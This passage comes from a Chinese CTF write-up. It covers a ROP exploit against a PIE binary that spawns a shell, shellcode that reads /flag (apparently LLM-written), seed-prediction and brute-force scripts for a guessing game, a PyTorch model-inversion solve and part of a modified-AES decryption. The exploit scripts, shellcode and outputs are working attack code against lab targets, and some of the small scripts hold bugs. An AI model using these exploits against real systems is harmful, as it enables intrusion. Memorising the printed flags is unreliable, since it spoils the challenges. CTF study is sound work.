0x0000000000001157: call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x0000000000001010: call rax; add rsp, 8; ret; 
0x00000000000011f3: in eax, 0x5f; ret; 
0x000000000000100e: je 0x1012; call rax; add rsp, 8; ret; 
0x00000000000011df: lea eax, [rip + 0xe1f]; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011de: lea rax, [rip + 0xe1f]; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x000000000000115c: mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x000000000000127d: mov eax, 0; leave; ret; 
0x0000000000001005: mov eax, dword ptr [rip + 0x2fc5]; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000000011f2: mov ebp, esp; pop rdi; ret; 
0x0000000000001273: mov edi, 0; call 0x1060; mov eax, 0; leave; ret; 
0x00000000000011e6: mov edi, eax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011d0: mov edi, eax; call 0x1070; nop; pop rbp; ret; 
0x0000000000001271: mov esi, eax; mov edi, 0; call 0x1060; mov eax, 0; leave; ret; 
0x0000000000001004: mov rax, qword ptr [rip + 0x2fc5]; test rax, rax; je 0x1012; call rax; add rsp, 8; ret; 
0x00000000000011f1: mov rbp, rsp; pop rdi; ret; 
0x00000000000011e5: mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011cf: mov rdi, rax; call 0x1070; nop; pop rbp; ret; 
0x0000000000001270: mov rsi, rax; mov edi, 0; call 0x1060; mov eax, 0; leave; ret; 
0x0000000000001123: nop dword ptr [rax + rax]; ret; 
0x00000000000010e1: nop dword ptr [rax]; ret; 
0x0000000000001122: nop word ptr [rax + rax]; ret; 
0x0000000000001163: pop rbp; ret; 
0x00000000000011f4: pop rdi; ret; 
0x00000000000011f0: push rbp; mov rbp, rsp; pop rdi; ret; 
0x0000000000001042: ret 0x2f; 
0x000000000000111d: sal byte ptr [rax + rcx - 1], 0xe0; nop word ptr [rax + rax]; ret; 
0x00000000000010dc: sal byte ptr [rcx + rcx - 1], 0xe0; nop dword ptr [rax]; ret; 
0x000000000000100d: sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret;                                                                        
0x0000000000001285: sub esp, 8; add rsp, 8; ret; 
0x0000000000001284: sub rsp, 8; add rsp, 8; ret; 
0x000000000000100c: test eax, eax; je 0x1012; call rax; add rsp, 8; ret;                                                                        
0x000000000000100b: test rax, rax; je 0x1012; call rax; add rsp, 8; ret;                                                                        
0x0000000000001282: leave; ret; 
0x00000000000011d7: nop; pop rbp; ret; 
0x0000000000001016: ret; 
                                                                        
┌──(kali㉿kali)-[~/Desktop/ctf]
└─$ ropper -f pwn | grep "pop"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x0000000000001150: add byte ptr [rax], al; call 0x1080; call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x00000000000011e3: add byte ptr [rax], al; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011cd: add byte ptr [rax], al; mov rdi, rax; call 0x1070; nop; pop rbp; ret; 
0x0000000000001161: add byte ptr [rcx], al; pop rbp; ret; 
0x000000000000114f: add byte ptr cs:[rax], al; call 0x1080; call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x00000000000011e0: add eax, 0xe1f; mov rdi, rax; call 0x1040; nop; pop rbp; ret;                                                               
0x000000000000115e: and eax, 0x100002f; pop rbp; ret; 
0x00000000000011e8: call 0x1040; nop; pop rbp; ret; 
0x00000000000011d2: call 0x1070; nop; pop rbp; ret; 
0x0000000000001152: call 0x1080; call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x0000000000001157: call 0x10c0; mov byte ptr [rip + 0x2f25], 1; pop rbp; ret;                                                                  
0x00000000000011df: lea eax, [rip + 0xe1f]; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011de: lea rax, [rip + 0xe1f]; mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x000000000000115c: mov byte ptr [rip + 0x2f25], 1; pop rbp; ret; 
0x00000000000011f2: mov ebp, esp; pop rdi; ret; 
0x00000000000011e6: mov edi, eax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011d0: mov edi, eax; call 0x1070; nop; pop rbp; ret; 
0x00000000000011f1: mov rbp, rsp; pop rdi; ret; 
0x00000000000011e5: mov rdi, rax; call 0x1040; nop; pop rbp; ret; 
0x00000000000011cf: mov rdi, rax; call 0x1070; nop; pop rbp; ret; 
0x0000000000001163: pop rbp; ret; 
0x00000000000011f4: pop rdi; ret; 
0x00000000000011f0: push rbp; mov rbp, rsp; pop rdi; ret; 
0x00000000000011d7: nop; pop rbp; ret;
```

好了，信息都搜集完了，尝试写个脚本

```python
from pwn import *

r = remote("127.0.0.1", 7450)
elf = ELF("pwn")

r.recvuntil(b"welcome to xswctf!!here is a gift.")
r.recvline()

gift_addr = int(r.recvline().strip().replace(b'\n',b'').decode(), 16)
gift_offset = 0x4038
base_addr = gift_addr - gift_offset

pop_rdi_ret_offset = 0x11f4
pop_rdi_ret_addr = base_addr + pop_rdi_ret_offset
sh_offset = 0x4048
sh_addr = base_addr + sh_offset
ret_offset = 0x1016
ret_addr = base_addr + ret_offset
system_offset = elf.sym["system"]
system_addr = base_addr + system_offset

payload = b'a'*(32+8)+p64(pop_rdi_ret_addr)+p64(sh_addr)+p64(ret_addr)+p64(system_addr)
r.sendline(payload)

r.interactive()
```

**解读：**

- `b'a'*(32+8)`中`32`是`buf`的缓冲区`4*8=32`，`8`是上一个`rdp`基址寄存器
- `p64(pop_rdi_ret_addr)`是将`p64(sh_addr)`压入栈
- `p64(ret_addr)`是弹到跳转到`p64(system_addr)`

运行测试脚本

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to 127.0.0.1 on port 7450
[x] Opening connection to 127.0.0.1 on port 7450: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 7450: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] Switching to interactive mode
ls
bin
dev
flag
lib
lib64
pwn
cat flag
XSWCTF{yOU_aR3_7hE_beST_pWN3R_16c6397f75c6}
```

**得到：**XSWCTF{yOU_aR3_7hE_beST_pWN3R_16c6397f75c6}



### shellcode的艺术(尝鲜版)

#### 解题过程

下载解压直接扔进IDA查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  vuln();
  return 0;
}

void vuln()
{
  _BYTE buf[312]; // [rsp+0h] [rbp-140h] BYREF
  unsigned __int64 v1; // [rsp+138h] [rbp-8h]

  v1 = __readfsqword(0x28u);
  puts(&s);
  read(0, buf, 0x12CuLL);
  __asm { jmp     rsi }
}
```

**分析：**

- `0x12C==300`无栈溢出漏洞
- 存在`__asm { jmp     rsi }`跳转指令，可在buf写入shellcode

这里我也不怎么会写nasm所以让大模型帮我写了一个

```nasm
; 1. IO 重定向：将标准输出/错误输出绑定到 socket（fd=0）
xor rax, rax             ; rax=0，置零寄存器
mov rdi, 0               ; rdi=0（socket fd）
mov rsi, 1               ; rsi=1（标准输出）
mov al, 63               ; rax=63（dup2 系统调用号）
syscall                  ; dup2(0, 1)：标准输出重定向
mov rsi, 2               ; rsi=2（标准错误）
syscall                  ; dup2(0, 2)：标准错误重定向

; 2. 栈对齐 + 预留缓冲区（32字节栈空间，16字节对齐）
sub rsp, 0x20            ; 栈指针下移 32 字节，既对齐又预留缓冲区

; 3. open("/flag", O_RDONLY, 0)：打开 Flag 文件
xor rax, rax             ; rax=0
mov rdi, 0x0067616c662f  ; rdi="/flag\0"（小端存储：0x2f666c616700）
push rdi                 ; 压栈 "/flag\0"，rsp 指向该字符串地址
mov rdi, rsp             ; rdi=字符串地址（open 第1参数）
xor rsi, rsi             ; rsi=0（O_RDONLY，只读模式）
xor rdx, rdx             ; rdx=0（文件权限，忽略）
mov al, 2                ; rax=2（open 系统调用号）
syscall                  ; 执行 open，返回 fd 存入 rax

; 4. read(fd, 缓冲区, 4096)：读取文件内容
mov rdi, rax             ; rdi=fd（read 第1参数）
mov rsi, rsp+0x10        ; rsi=栈缓冲区地址（预留 16 字节，避免覆盖字符串）
mov rdx, 0x1000          ; rdx=4096（读取长度，足够容纳 Flag）
mov al, 0                ; rax=0（read 系统调用号）
syscall                  ; 执行 read，读取长度存入 rax

; 5. write(1, 缓冲区, 读取长度)：输出 Flag 到 socket
mov rdi, 1               ; rdi=1（标准输出，已重定向到 socket）
mov rdx, rax             ; rdx=读取长度（write 第3参数）
mov al, 1                ; rax=1（write 系统调用号）
syscall                  ; 执行 write，输出 Flag
```

然后生成`shellcode`

```
core_shellcode = b"\x48\x31\xc0"  # xor rax, rax
core_shellcode += b"\xbf\x00\x00\x00\x00"  # mov rdi, 0
core_shellcode += b"\xbe\x01\x00\x00\x00"  # mov rsi, 1
core_shellcode += b"\xb0\x3f"  # mov al, 63
core_shellcode += b"\x0f\x05"  # syscall（dup2(0,1)）
core_shellcode += b"\xbe\x02\x00\x00\x00"  # mov rsi, 2
core_shellcode += b"\x0f\x05"  # syscall（dup2(0,2)）
core_shellcode += b"\x48\x83\xec\x20"  # sub rsp, 0x20
core_shellcode += b"\x48\x31\xc0"  # xor rax, rax
core_shellcode += b"\x48\xbf\x2f\x66\x6c\x61\x67\x00\x00\x00"  # mov rdi, "/flag\0"
core_shellcode += b"\x57"  # push rdi
core_shellcode += b"\x48\x89\xe7"  # mov rdi, rsp
core_shellcode += b"\x48\x31\xf6"  # xor rsi, rsi
core_shellcode += b"\x48\x31\xd2"  # xor rdx, rdx
core_shellcode += b"\xb0\x02"  # mov al, 2
core_shellcode += b"\x0f\x05"  # syscall（open）
core_shellcode += b"\x48\x89\xc7"  # mov rdi, rax
core_shellcode += b"\x48\x8d\x74\x24\x10"  # mov rsi, rsp+0x10
core_shellcode += b"\x48\xba\x00\x10\x00\x00\x00\x00\x00\x00"  # mov rdx, 0x1000
core_shellcode += b"\xb0\x00"  # mov al, 0
core_shellcode += b"\x0f\x05"  # syscall（read）
core_shellcode += b"\xbf\x01\x00\x00\x00"  # mov rdi, 1
core_shellcode += b"\x48\x89\xc2"  # mov rdx, rax
core_shellcode += b"\xb0\x01"  # mov al, 1
core_shellcode += b"\x0f\x05"  # syscall（write）
```

编写一下脚本

```python
from pwn import *

p = remote('127.0.0.1', 11431)

p.recvuntil(b"\n")

jump_codes = b""
for offset in range(0, 0x20, 2):
    rel_offset = 0x20 - (offset + 2)
    jump_codes += b"\xeb" + bytes([rel_offset])

core_shellcode = b"\x48\x31\xc0\xbf\x00\x00\x00\x00\xbe\x01\x00\x00\x00\xb0\x3f\x0f\x05"
core_shellcode += b"\xbe\x02\x00\x00\x00\x0f\x05\x48\x83\xec\x20\x48\x31\xc0\x48\xbf\x2f\x66\x6c\x61\x67\x00\x00\x00"
core_shellcode += b"\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x02\x0f\x05\x48\x89\xc7\x48\x8d\x74\x24\x10"
core_shellcode += b"\x48\xba\x00\x10\x00\x00\x00\x00\x00\x00\xb0\x00\x0f\x05\xbf\x01\x00\x00\x00\x48\x89\xc2\xb0\x01\x0f\x05"

nop_pad = b"\x90" * (0x12C - len(jump_codes) - len(core_shellcode))
payload = jump_codes + core_shellcode + nop_pad

p.send(payload)

result = p.recvall(timeout=5)
flag = "".join([chr(c) for c in result if 0x20 <= c <= 0x7e or c in (0x0a, 0x0d)])

print(flag.strip())
```

运行测试脚本得到flag

**得到：**XSWCTF{d26b4cf9-7beb-4098-b412-2ef754ff3ed6}



### 数字炸弹bomb!

#### 解题过程

下载解压直接扔进IDA查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v5; // [rsp+0h] [rbp-30h] BYREF
  int i; // [rsp+4h] [rbp-2Ch]
  int v7; // [rsp+8h] [rbp-28h]
  int v8; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v10; // [rsp+28h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = time(0LL);
  srand(v3);
  v7 = rand() % 500;
  puts(&byte_2028);
  printf(&format);
  v8 = read(0, buf, 0x14uLL);
  buf[v8 - 1] = 0;
  printf(buf);
  puts(asc_2083);
  puts("---------------------------------------------------");
  puts(asc_20D0);
  for ( i = 0; i <= 2; ++i )
  {
    printf(&byte_2110);
    __isoc99_scanf(&unk_214C, &v5);
    if ( v7 == v5 )
      win();
    if ( v7 > v5 )
      puts(&byte_214F);
    if ( v7 < v5 )
      puts(&byte_215D);
  }
  puts("---------------------------------------------------");
  puts(asc_2170);
  puts(&byte_21B0);
  return 0;
}
```

**分析：**

- 这是很简单的猜数字游戏
- 能想到三种方法，`纯玩`、`爆破`和`CDLL`

**方法一**

- 纯玩 (**声明：我是用这种方法做出来的，所以另外两种方法我只写思路不做过多解释或代码示例**)

  很简单就是直接玩

  猜对了就能直接得到shell了

  我玩了不超过4次，本来是带着测试的心去猜的，没想到真给我猜对了，就赶紧时间没深究其他的

  (不信的话可以找我给你看截图)

**方法二**

- 爆破

  也很简单

  意思就是用脚本循环连接

  然后随机输入

  直到正确为止
  
- 还是简单补充一下脚本吧

  ```python
  from pwn import *
  
  while True:
      r = remote("localhost", 9999)
      r.recvuntil(b"xxx")
      r.sendline(b"250")
      if r.recvline(b"").__contain__(b"xxx"):
          r.interaction()
      else:
          r.close
  ```

**方法三**

- CDLL

  这道题以当前时间作为随机种子并且每次连接都会更新

  那么很简单我们可以用python的CDLL调用C的函数获得同样的种子就可以知道要猜的数据了

  然后通过数据发payload得到shell
  
- 这里也是简单补充一下脚本

  ```python
  from pwn import *
  from ctypes import CDLL
  
  dcll = CDLL("pwn")
  r = remote("localhost", 9999)
  
  dcll.srand(int(time.time())) # 这里不用导入time，因为上面的包已经间接导入了
  seed = dcll.rand()
  guess = sedd % 500
  
  r.sendline(guess.encode("utf-8"))
  
  r.interaction()
  ```

  

**最终得到：**XSWCTF{08879d07-2f29-49e6-bc0a-a6413384a176}



## AI

### 简单爱

#### 解题过程

下载解压得到一堆文件，我们简单来看一下

加密

```python
import torch
import torch.nn as nn
from secret import flag

class MyNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear1 = nn.Linear(1, 512)
        self.linear2 = nn.Linear(512, 2048)
        self.linear3 = nn.Linear(2048, 1024)
        self.linear4 = nn.Linear(1024, 95)
        self.active = nn.ReLU()
        self.reg = nn.LogSoftmax(dim=1)
    def forward(self, x):
        x = self.active(self.linear1(x))
        x = self.active(self.linear2(x))
        x = self.active(self.linear3(x))
        x = self.reg(self.linear4(x))
        return x

model = torch.load('model',weights_only=False)
flag = torch.Tensor([[float(i)] for i in flag])

with open('output.txt','w') as f:
    a = model(flag)
    f.write(bytes([i+32 for i in a.argmax(dim=1).tolist()]).decode())
    
    
```

训练

```python
import torch
import torch.nn as nn

data = list(range(32,127))

with open('label.txt','rb') as f:
    label = [i-32 for i in f.read()]

class MyNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear1 = nn.Linear(1, 512)
        self.linear2 = nn.Linear(512, 2048)
        self.linear3 = nn.Linear(2048, 1024)
        self.linear4 = nn.Linear(1024, 95)
        self.active = nn.ReLU()
        self.reg = nn.LogSoftmax(dim=1)
    def forward(self, x):
        x = self.active(self.linear1(x))
        x = self.active(self.linear2(x))
        x = self.active(self.linear3(x))
        x = self.reg(self.linear4(x))
        return x

##model = MyNet()
model = torch.load('model',weights_only=False)

optim = torch.optim.Adam(model.parameters(), lr = 0.00001)
loss = nn.NLLLoss()

print('training')

model.train()
for epoch in range(5000):
    in_d = torch.Tensor([[float(data[i])] for i in range(95)])
    out_d = torch.tensor([label[i] for i in range(95)],dtype=torch.int64)
    optim.zero_grad()
    pred = model(in_d)
    pred_loss = loss(pred, out_d)
    pred_loss.backward()
    optim.step()
    if epoch % 100 == 0:
        print(f'epoch {epoch}; loss: {pred_loss.item()}')

model.train(False)
torch.save(model, 'model')

```

输出层

```txt
s'c@ixLW$d"&dF4"S)]BHN"7O"@"03H6_dqp%dF8
```

还有一个模型文件

一看到`torch`就知道是CNN卷积神经网络的题目了

给了输出层和加密过程以及模型，猜测flag应该就是输入层了

**处理流程**

- 输入：原始flag字符（ASCII编码）
- 处理：将每个字符转换为float输入模型
- 输出：每个输入对应95维输出向量，取`argmax`得到索引（0-94）
- 转换：索引+32→可打印ASCII范围（32-126）
- 保存：转换后的ASCII字符写入`output.txt`

写一个简单的逆向还原脚本

```python
import torch
import torch.nn as nn

class MyNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear1 = nn.Linear(1, 512)
        self.linear2 = nn.Linear(512, 2048)
        self.linear3 = nn.Linear(2048, 1024)
        self.linear4 = nn.Linear(1024, 95)
        self.active = nn.ReLU()
        self.reg = nn.LogSoftmax(dim=1)

    def forward(self, x):
        x = self.active(self.linear1(x))
        x = self.active(self.linear2(x))
        x = self.active(self.linear3(x))
        x = self.reg(self.linear4(x))
        return x

# 导入模型
model = torch.load('model', weights_only=False)

# 这里是输出层的数据
indices = [83, 7, 67, 32, 73, 88, 44, 55, 4, 68, 2, 6, 68, 38, 20, 2, 51, 9, 61, 34, 40, 46, 2, 23, 47, 2, 32, 2, 16, 19, 40, 22, 63, 68, 81, 80, 5, 68, 38, 24]

flag = []
for idx in indices:
    # 暴力枚举
    for c in range(0, 128):
        input_tensor = torch.tensor([[float(c)]])
        output = model(input_tensor)
        argmax_idx = output.argmax(dim=1).item()
        if argmax_idx == idx:
            flag.append(chr(c))
            break

print(''.join(flag))
```

运行测试脚本得到

```cmd
C:\Users\probie\Desktop\writeup\简单爱2.0>python decrypt.py
XSWCTF{Y0u_Mus7_4dm1r3_AI_C_feryquitous}
```

**得到：**XSWCTF{Y0u_Mus7_4dm1r3_AI_C_feryquitous}



### 简单爱 (复现)

#### 解题过程

```python
import torch
import torch.nn as nn

class MyNet(nn.Module):
    def __init__(self):
        super().__init__()
        self.linear1 = nn.Linear(1, 512)
        self.linear2 = nn.Linear(512, 2048)
        self.linear3 = nn.Linear(2048, 1024)
        self.linear4 = nn.Linear(1024, 95)
        self.active = nn.ReLU()
        self.reg = nn.LogSoftmax(dim=1)
    def forward(self, x):
        x = self.active(self.linear1(x))
        x = self.active(self.linear2(x))
        x = self.active(self.linear3(x))
        x = self.reg(self.linear4(x))
        return x

model = torch.load('model',weights_only=False)

C = "s'c@ixLW$d\"&dF4\"S)]BHN\"7O\"@\"03H6_dqp%dF8"
flag = ""

for c in C:
    for i in range(32, 127):
        inputWord = torch.Tensor([[float(i)]])
        outputWord = model(inputWord)
        if ord(c)-32 == outputWord.argmax(dim=1).item():
            flag += chr(i)
            break

print(flag)
```

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
XSWCTF{Y0u_Mus7_4dm1r3_AI_C_feryquitous}

进程已结束，退出代码为 0
```

**得到：XSWCTF{Y0u_Mus7_4dm1r3_AI_C_feryquitous}**



## Crypto

### Alice Enc

#### 解题过程

下载双击打开看到加密源码

```python
with open("/home/ctf/flag", "r") as f:
    flag = f.read().strip().encode()

rc = [0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78,
      0x89, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xf1]

s_box = [
    [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
        0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76],
    [0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
        0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0],
    [0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
        0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15],
    [0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
        0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75],
    [0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
        0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84],
    [0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
        0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf],
    [0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
        0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8],
    [0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
        0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2],
    [0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,
        0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73],
    [0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,
        0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb],
    [0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,
        0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79],
    [0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,
        0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08],
    [0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,
        0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a],
    [0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,
        0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e],
    [0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,
        0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf],
    [0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,
        0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16],
]

s_box_inv = [
    [0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38,
        0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb],
    [0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87,
        0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb],
    [0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d,
        0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e],
    [0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2,
        0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25],
    [0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16,
        0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92],
    [0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda,
        0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84],
    [0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a,
        0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06],
    [0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02,
        0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b],
    [0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea,
        0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73],
    [0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85,
        0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e],
    [0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89,
        0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b],
    [0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20,
        0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4],
    [0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31,
        0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f],
    [0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d,
        0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef],
    [0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0,
        0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61],
    [0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26,
        0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d],
]


def sub_bytes(grid):
    for i, v in enumerate(grid):
        grid[i] = s_box[v >> 4][v & 0xf]


def shift_rows(grid):
    for i in range(4):
        grid[i::4] = grid[i::4][i:] + grid[i::4][:i]
        grid = grid[0::4] + grid[1::4] + grid[2::4] + grid[3::4]


def mix_columns(grid):
    def mul_by_2(n):
        s = (n << 1) & 0xff
        if n & 128:
            s ^= 0x1b
        return s

    def mul_by_3(n):
        return n ^ mul_by_2(n)

    def mix_column(c):
        return [
            mul_by_2(c[0]) ^ mul_by_3(c[1]) ^ c[2] ^ c[3],
            c[0] ^ mul_by_2(c[1]) ^ mul_by_3(c[2]) ^ c[3],
            c[0] ^ c[1] ^ mul_by_2(c[2]) ^ mul_by_3(c[3]),
            mul_by_3(c[0]) ^ c[1] ^ c[2] ^ mul_by_2(c[3]),
        ]

    for i in range(0, 16, 4):
        grid[i:i + 4] = mix_column(grid[i:i + 4])


def key_expansion(grid):
    for i in range(10 * 4):
        r = grid[-4:]
        if i % 4 == 0:
            for j, v in enumerate(r[1:] + r[:1]):
                r[j] = s_box[v >> 4][v & 0xf] ^ (rc[i // 4] if j == 0 else 0)
        for j in range(4):
            grid.append(grid[-16] ^ r[j])
    return grid


def add_round_key(grid, round_key):
    for i in range(16):
        grid[i] ^= round_key[i]


def encrypt(b, expanded_key):
    add_round_key(b, expanded_key)
    for i in range(1, 10):
        sub_bytes(b)
        shift_rows(b)
        mix_columns(b)
        add_round_key(b, expanded_key[i * 16:])
    sub_bytes(b)
    shift_rows(b)
    add_round_key(b, expanded_key[-16:])
    return b


def aes(key, msg):
    expanded = key_expansion(bytearray(key))
    b = bytearray(msg + b'\x00' * (16 - len(msg) % 16))
    for i in range(0, len(b), 16):
        b[i:i + 16] = encrypt(b[i:i + 16], expanded)
    return bytes(b)


if __name__ == '__main__':
    key = b'Slightly different from the AES.'
    enc = aes(key, flag)
    print('Encrypted:', enc)

```

**分析：**

- 这是典型的`AES`对称加密算法
- 不同点在它行移位操作在列重组之后进行

我们先连接容器获取一下数据

```cmd
C:\Users\probie>nc 127.0.0.1 1887
Encrypted: b'\x8d\xf4\xf4I\x114\x9d\xfds\x81\xb9\xafM\xf2G\xc8\xc3\xe8\xad\xff\xd5?\x19\xbb\xfeA\xdd\xfd\xeb)P\xdeX\x9c\xeb+\xaf\x947\x04\xd1\x1bC\xb4\x0c \xc3\xe7\x91+\x1d\xd5\x92\x93\xd9\tN\xd3\xb1*a\xe8\x15;'
```

有了这些就很简单了，网上搜一下`AES加密过程`然后一点点逆推出解密脚本

简单附带一下脚本

```python
rc = [0x12, 0x23, 0x34, 0x45, 0x56, 0x67, 0x78,
      0x89, 0x9a, 0xab, 0xbc, 0xcd, 0xde, 0xef, 0xf1]

s_box = [
    [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,
        0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76],
    [0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,
        0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0],
    [0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,
        0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15],
    [0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,
        0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75],
    [0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,
        0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84],
    [0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,
        0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf],
    [0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,
        0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8],
    [0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,
